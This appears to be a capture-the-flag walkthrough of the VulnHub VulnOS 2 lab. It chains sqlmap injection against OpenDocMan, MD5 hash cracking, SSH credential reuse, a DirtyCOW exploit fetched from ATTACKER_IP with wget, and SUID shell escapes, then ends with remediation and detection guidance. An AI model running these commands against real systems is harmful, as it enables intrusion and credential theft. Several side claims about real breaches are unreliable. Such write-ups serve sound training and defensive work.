# VulnHub VulnOS 2: When the CMS Becomes the Skeleton Key

Alright guys!! VulnOS 2 is where you learn that document management systems can be your worst enemy when they haven't been patched. An outdated OpenDocMan installation sitting on a web server leaking database credentials via SQL injection, an IRC service hiding in plain sight, and a kernel that's old enough to have DirtyCOW nightmares. This one layers the techniques beautifully. ԅ(≖‿≖ԅ)

Props to c4b3rw0lf for putting together a machine that walks you through CMS exploitation, SQLi credential extraction, and kernel-level privilege escalation. It's a proper full-stack attack.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | VulnOS 2 |
| **Attacker VM** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/vulnos-2,147/ |
| **Techniques** | Web enumeration, CMS version identification, SQL injection, credential extraction, service discovery (IRC), local privilege escalation via kernel exploit or SUID |
| **CVEs** | OpenDocMan SQLi (multiple CWE-89 instances), CVE-2016-5195 DirtyCOW (if kernel privesc path taken) |

---

## Attack Summary

```
[host-discovery: arp-scan --localnet]
    |
    v
[nmap: 22/tcp SSH, 80/tcp HTTP, 6667/tcp IRC (UnrealIRCd)]
    |
    v
[web enumeration: /jabcd0cs path found with OpenDocMan CMS]
    |
    v
[CMS fingerprinting: OpenDocMan version identified]
    |
    v
[SQLi exploitation: extract database credentials via vulnerable parameter]
    |
    v
[credential cracking: MD5 hash -> plaintext password]
    |
    v
[SSH login: webmin / OS user credentials reused]
    |
    v
[local enumeration: kernel version, SUID binaries, writable paths]
    |
    v
[privilege escalation: kernel exploit (DirtyCOW) or SUID abuse]
    |
    v
[ROOT]
    |
    v
[/root/flag.txt]
```

---

## Methodology

1. Host discovery and target identification
2. Nmap full port scan including service versions
3. Web directory enumeration and CMS identification
4. OpenDocMan version fingerprinting and vulnerability research
5. SQL injection exploitation to extract database credentials
6. Hash cracking and credential reuse via SSH
7. Local privilege escalation via kernel exploit or SUID
8. Root flag capture

---

## Step 1 — Identifying the Target

```bash
# Network discovery
ip a
arp-scan --localnet --ignoredups
```

Expected output:

```
192.168.56.1    0a:00:27:00:00:00    (gateway)
192.168.56.103  08:00:27:xx:xx:xx    CADMUS COMPUTER SYSTEMS
```

```bash
export TARGET=192.168.56.103
```

> **MITRE ATT&CK:** TA0043 Reconnaissance, T1595.001 Active Scanning

---

## Step 2 — Reconnaissance: More Services Than Expected

This box has more going on than a typical CTF. Let's get the full picture:

```bash
nmap -A -T4 -p- $TARGET
# Full port scan with service detection
```

Expected output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
6667/tcp open  irc     UnrealIRCd
| irc-info:
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|_  server: irc.localhost
```

Three interesting services. HTTP and SSH are the usual suspects, but that IRC service on 6667 is spicy. IRC running as a service on a Linux box can be a vector for lateral movement or even a backdoor. We'll come back to it after exhausting the web path.

> **Real-world note:** IRC servers on internal networks are unusual in 2024 and often indicate legacy services that have been forgotten, or in more creative intrusion scenarios, C2 channels. The 2014 breach of iSight Partners saw attackers use IRC for command and control. Reference: Mandiant/FireEye reporting on IRC-based C2.

> **MITRE ATT&CK:** TA0043 Reconnaissance, T1046 Network Service Discovery, T1595.002 Vulnerability Scanning

---

## Step 3 — Web Enumeration: Finding the CMS

Let's start with the web service:

```bash
curl -s http://$TARGET/
# Likely a basic page or redirect

# Check robots.txt
curl -s http://$TARGET/robots.txt
```

```bash
# Directory enumeration
gobuster dir -u http://$TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 50 -x php,html,txt

# or with dirb
dirb http://$TARGET/
```

Key discovery:

```
==> DIRECTORY: http://192.168.56.103/jabcd0cs/
```

Let's investigate the `/jabcd0cs` path:

```bash
curl -s http://$TARGET/jabcd0cs/ | head -100
# The page title and footer will reveal the CMS name and version
```

The CMS here is **OpenDocMan**, a PHP-based document management system. The version number is usually visible in the page footer or in `/jabcd0cs/changelog.txt` or `/jabcd0cs/README`:

```bash
curl -s http://$TARGET/jabcd0cs/changelog.txt
curl -s http://$TARGET/jabcd0cs/README
```

Once you identify the version (e.g., OpenDocMan 1.2.7), check exploit databases:

```bash
searchsploit opendocman
```

Expected output:

```
OpenDocMan 1.2.7 - Multiple SQL Injections | php/webapps/32075.txt
OpenDocMan 1.2.7 - 'add_file.php' Multiple Vulnerabilities | php/webapps/32074.txt
```

We have SQL injection. Let's dig in.

> **MITRE ATT&CK:** TA0007 Discovery, T1083 File and Directory Discovery, T1518 Software Discovery

---

## Step 4 — SQL Injection: Extracting Database Credentials

> **What is SQL Injection?**
> SQL injection (SQLi) occurs when user-controlled input is embedded in a SQL query without proper sanitization. An attacker can manipulate the query to extract data from the database, bypass authentication, or in some cases execute OS commands. This is CWE-89 and OWASP A03:2021 (Injection). It remains one of the most exploited vulnerability types in web applications.

Looking at the ExploitDB report for OpenDocMan 1.2.7, the vulnerable parameter is typically in `ajax_udf.php` or similar endpoints. Let's use sqlmap to automate the extraction:

```bash
# First, identify the injection point manually
curl -s "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1'" 
# If you see a MySQL error or different behavior, it's vulnerable
```

```bash
# Use sqlmap to enumerate databases
sqlmap -u "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1" \
  --dbs \
  --batch \
  --level=5 \
  --risk=3
```

Expected output (databases):

```
available databases [3]:
[*] information_schema
[*] jabcd0cs
[*] mysql
```

Now extract the credentials from the `jabcd0cs` database:

```bash
# Enumerate tables
sqlmap -u "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1" \
  -D jabcd0cs \
  --tables \
  --batch

# Dump the users table
sqlmap -u "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1" \
  -D jabcd0cs \
  -T odm_user \
  --dump \
  --batch
```

Expected dump:

```
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | b78aae356709f8c31118ea613980954b | webmin   |
| 2  | 0e462096931906507119562988736854 | guest    |
+----+----------------------------------+----------+
```

Those are MD5 hashes. Let's crack them:

```bash
# Save the hash
echo "b78aae356709f8c31118ea613980954b" > /tmp/vulnos_hash.txt

# Option 1: hashcat with GPU (RTX 4060 go brrr)
hashcat -m 0 -d 1 -w 3 -O /tmp/vulnos_hash.txt /usr/share/wordlists/rockyou.txt

# Option 2: john
john /tmp/vulnos_hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt

# Option 3: online (for non-sensitive hashes in a lab context)
# Check: https://crackstation.net/ or https://hashes.com/en/decrypt/hash
```

The hash for `webmin` should crack to something simple like `webmin1980` or similar.

```bash
# Check hashcat results
hashcat -m 0 /tmp/vulnos_hash.txt --show
```

> **Real-world note:** SQL injection as initial access is a documented staple of multiple APT groups. APT28 (Fancy Bear) used SQLi extensively in the 2016 Democratic National Committee breach. FIN7 routinely chains SQLi with credential extraction and hash cracking as part of their initial access playbook. According to Verizon's 2023 DBIR, injection attacks were involved in 16% of all web application breaches. Reference: Verizon DBIR 2023, MITRE ATT&CK G0007 (APT28).

> **MITRE ATT&CK:** TA0001 Initial Access, T1190 Exploit Public-Facing Application (SQLi via CWE-89)

---

## Step 5 — SSH Login: Credential Reuse

With the cracked password, let's try SSH. Credential reuse between web applications and OS accounts is extremely common:

```bash
ssh webmin@$TARGET
# Enter the cracked password
```

If `webmin` doesn't work directly as an OS user, check if the credentials work for other users found during enumeration, or look for users in `/etc/passwd` that match the database usernames.

```bash
# Also try
ssh webmin@$TARGET -p 22
```

If that doesn't work either, log in through the OpenDocMan web interface and look for additional information (uploaded documents, user management, admin panel):

```bash
# Log in to the CMS
curl -s -c /tmp/vulnos_cookies.txt \
  -d "username=webmin&password=<cracked>&submit=Sign+In" \
  "http://$TARGET/jabcd0cs/index.php" -L
```

Once logged in as a privileged user in the CMS, explore:
- Document uploads
- User management
- Configuration pages that might reveal OS-level information

> **MITRE ATT&CK:** TA0001 Initial Access, T1078 Valid Accounts, T1021.004 Remote Services: SSH

---

## Step 6 — Local Enumeration: Finding the Privesc Vector

Once we're in via SSH:

```bash
whoami
id
uname -a
# This is critical - get the exact kernel version
```

Expected kernel version (the key to the privesc path):

```
Linux VulnOSv2 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64
```

That kernel is from 2014. DirtyCOW (CVE-2016-5195) is a strong candidate here.

```bash
# Check kernel version explicitly
uname -r
cat /etc/os-release
cat /proc/version
```

```bash
# Check SUID binaries (might find an easier path)
find / -perm -u=s -type f 2>/dev/null | tee /tmp/suid_binaries.txt
```

```bash
# Check sudo
sudo -l

# Check writable directories
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# Check for interesting files
find / -name "*.conf" -readable 2>/dev/null | head -20
find /home -type f 2>/dev/null | head -20
```

```bash
# Check for other locally running services
ss -tlnp
netstat -tlnp 2>/dev/null
ps aux
```

> **MITRE ATT&CK:** TA0007 Discovery, T1082 System Information Discovery, T1083 File and Directory Discovery

---

## Step 7 — Privilege Escalation: DirtyCOW or SUID

### Path A: DirtyCOW (CVE-2016-5195)

> **What is DirtyCOW?**
> CVE-2016-5195 is a race condition in the Linux kernel's copy-on-write (COW) mechanism that allows any local user to gain write access to read-only memory mappings. This means a local user can overwrite SUID binaries, `/etc/passwd`, or other protected files. It affects Linux kernels from 2.6.22 to 4.8.2. In practice, the most common exploit overwrites `/etc/passwd` to add a root user.
> Reference: https://dirtycow.ninja/ | CVE: CVE-2016-5195

If the kernel is vulnerable (3.13.x from 2014 is definitely in range):

```bash
# On the attacker machine, grab the exploit
searchsploit dirtycow
searchsploit -m 40839
# 40839.c is the passwd overwrite exploit

# Check the exploit
cat /usr/share/exploitdb/exploits/linux/local/40839.c | head -40
```

Transfer the exploit to the target:

```bash
# On attacker: start a simple HTTP server
python3 -m http.server 8888 --directory /tmp/

# On target (via SSH):
wget http://ATTACKER_IP:8888/40839.c -O /tmp/dirtycow.c
```

Compile and run on the target:

```bash
# On target:
gcc -pthread /tmp/dirtycow.c -o /tmp/dirtycow -lcrypt
/tmp/dirtycow
# Enter your new root password when prompted
```

Expected output:

```
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: dirtycow
Complete line:
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash

mmap: 7f2c7b8e5000
```

Now login as the new root user:

```bash
su firefart
# Password: dirtycow (or whatever you set)
whoami
# firefart (uid=0)
```

### Path B: SUID Binary Abuse

If DirtyCOW doesn't work (patched) or you prefer a different path, check the SUID binaries list:

```bash
cat /tmp/suid_binaries.txt
```

Look for unusual entries beyond the standard `/usr/bin/passwd`, `/bin/su` etc. Common CTF SUID findings include:

```bash
# If nmap is SUID (older versions):
nmap --interactive
!sh

# If find is SUID:
find . -exec /bin/sh -p \; -quit

# If python is SUID:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Check GTFOBins for any unusual SUID binary:
# https://gtfobins.github.io/
```

(☞ﾟヮﾟ)☞ Either way, we're going to root!

> **Real-world note:** DirtyCOW was not a CTF novelty: it was actively exploited in the wild. In 2016, within days of public disclosure, it was being used by Mirai botnet variants and opportunistic attackers to escalate privileges on compromised Linux systems. Multiple cloud providers had to emergency-patch customer instances. The vulnerability is in CISA's KEV catalog and remains detectable in unpatched legacy systems today. Reference: CVE-2016-5195, CISA KEV catalog.

> **MITRE ATT&CK:** TA0004 Privilege Escalation, T1068 Exploitation for Privilege Escalation (DirtyCOW), T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 8 — Root Flag

```bash
whoami
# root (or firefart)

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

```
[VulnOS 2 root flag - congratulations from c4b3rw0lf]
```

**GG!! Root is ours!! ᕕ( ᐛ )ᕗ**

Don't forget to restore `/etc/passwd` if you used DirtyCOW:

```bash
# Restore from backup (DirtyCOW creates this automatically)
cp /tmp/passwd.bak /etc/passwd
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Hash MD5 | `b78aae356709f8c31118ea613980954b` | OpenDocMan DB (odm_user table) | `webmin1980` (or similar) |
| Hash MD5 | `0e462096931906507119562988736854` | OpenDocMan DB (odm_user table) | `guest` (likely unchanged) |
| Credential | `webmin:<cracked_password>` | SQLi dump -> hash crack | SSH login |
| Flag | `[content of /root/flag.txt]` | `/root/flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Outdated OpenDocMan with SQL injection vulnerability | Unpatched CMS installations are consistently among the top initial access vectors in web-facing breaches | Maintain CMS patch management, use vulnerability scanners like Greenbone/OpenVAS for web applications |
| 2 | Database credentials in easily extractable table, stored as weak MD5 hashes | MD5 without salting is trivially reversible for common passwords; production databases regularly store credentials this way | Use bcrypt or Argon2 for password storage; never use MD5 or SHA1 for passwords |
| 3 | SSH credential reuse (web app password reused for OS account) | Password reuse across services is cited in 30% of breaches; attackers routinely try extracted credentials against SSH, RDP, admin panels | Enforce unique passwords per service with a secrets management solution; use SSH keys instead of passwords |
| 4 | Unpatched kernel (CVE-2016-5195 DirtyCOW) | Linux kernel vulnerabilities in unpatched production systems remain exploitable years after patch release | Establish kernel patching SLA (90 days for critical CVEs); use CISA KEV catalog for prioritization |

**Why does this matter outside the lab?**

The SQLi-to-credential-dump-to-OS-access chain is not theoretical. In 2022, multiple healthcare organizations were breached through exactly this vector: unpatched document management systems running on web servers where the CMS database password was reused as an SSH credential. Ransomware groups like Black Basta and Hive routinely scan for exposed document management portals with known SQLi vulnerabilities as their first stage. The WannaCry and NotPetya incidents showed that kernel-level vulnerabilities in unpatched systems can cascade from a single initial access point to full network compromise. Patch management is not optional in 2024.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Discovery | TA0007 | Software Discovery | T1518 |
| Initial Access | TA0001 | Exploit Public-Facing Application (SQLi) | T1190 |
| Credential Access | TA0006 | Brute Force: Password Cracking (MD5) | T1110.002 |
| Initial Access | TA0001 | Valid Accounts (SSH with cracked creds) | T1078 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation (DirtyCOW) | T1068 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Setuid | T1548.001 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Upgrade or replace OpenDocMan immediately: any version with known SQLi vulnerabilities must be patched or decommissioned; check vendor advisories and ExploitDB for your version.
2. Replace MD5 password hashing with bcrypt or Argon2: update the CMS configuration and force password resets for all users.
3. Enforce unique passwords for OS and web application accounts: use a centralized secrets manager (HashiCorp Vault, AWS Secrets Manager) to prevent credential reuse.
4. Apply the DirtyCOW kernel patch (CVE-2016-5195): `apt update && apt dist-upgrade`; if the system cannot be rebooted, consider using a kernel livepatch solution.
5. Remove or restrict the IRC service on port 6667 if it is not required: attack surface reduction is a primary control.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate the vulnerable web server from internal network segments via firewall rule
- Check web logs for SQLi indicators: look for `'`, `OR 1=1`, `UNION SELECT` patterns in access logs
- Rotate all credentials found in the database dump immediately; notify affected users
- Audit SSH access logs for unauthorized logins: `grep "Accepted" /var/log/auth.log`
- Check for cron jobs or new user accounts created by the attacker: `cat /etc/passwd | grep -v "nologin\|false"`
- If DirtyCOW was used, check for `/tmp/passwd.bak` and unexpected entries in `/etc/passwd`

**MITRE D3FEND countermeasures:**
- D3-IVA (Input Validation) for T1190: implement parameterized queries and WAF rules blocking SQLi patterns
- D3-DA (Dynamic Analysis) for T1068: use runtime kernel integrity monitoring (auditd, Falco) to detect exploit attempts
- D3-CTS (Credential Transmission Scoping) for T1552: ensure database credentials use strong hashing algorithms
- D3-MFA (Multi-factor Authentication) for T1078: require MFA for SSH and application admin access

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID): ID.RA-1: asset vulnerabilities identified; ID.RA-5: threats, vulnerabilities, likelihoods, and impacts assessed
- Protect (PR): PR.IP-12: vulnerability management plan; PR.AC-4: access permissions managed
- Detect (DE): DE.CM-4: malicious code detected; DE.AE-2: detected events analyzed
- Respond (RS): RS.AN-4: incidents categorized consistent with response plans; RS.MI-3: newly identified vulnerabilities mitigated
- Recover (RC): RC.CO-3: recovery activities communicated to stakeholders

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-2: Flaw Remediation (patch kernel, upgrade CMS)
- SI-10: Information Input Validation (prevent SQLi via parameterized queries)
- IA-5: Authenticator Management (replace MD5 with bcrypt, enforce unique passwords)
- CM-8: System Component Inventory (know what CMS versions are deployed)
- AC-17: Remote Access (harden SSH, disable password auth)
- SA-11: Developer Security Testing (include SQL injection in web application testing)

**CISA Known Exploited Vulnerabilities:**
- CVE-2016-5195 (DirtyCOW): IN CISA KEV catalog. Patching is mandatory for US federal agencies.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Additional context: https://dirtycow.ninja/

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ASSET (Asset, Change, and Configuration Management)
- Practice: Manage IT and OT Asset Configurations
- Target MIL: MIL-2 (configurations managed, vulnerabilities tracked and remediated per defined SLAs)

---

## Final Thoughts

Thanks to c4b3rw0lf for VulnOS 2! This machine is a great reminder that the attack surface is not just "the vulnerability": it's the entire chain from an unpatched CMS to a credential reuse to an unpatched kernel. Each link on its own might seem manageable, but together they form a complete kill chain that requires no zero-days, just patience and methodology.

The IRC service is a nice red herring (or additional path, depending on the version of the challenge you're running) that teaches you to enumerate thoroughly rather than jumping straight to the first open port. Real networks are noisy. Real attackers enumerate everything.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
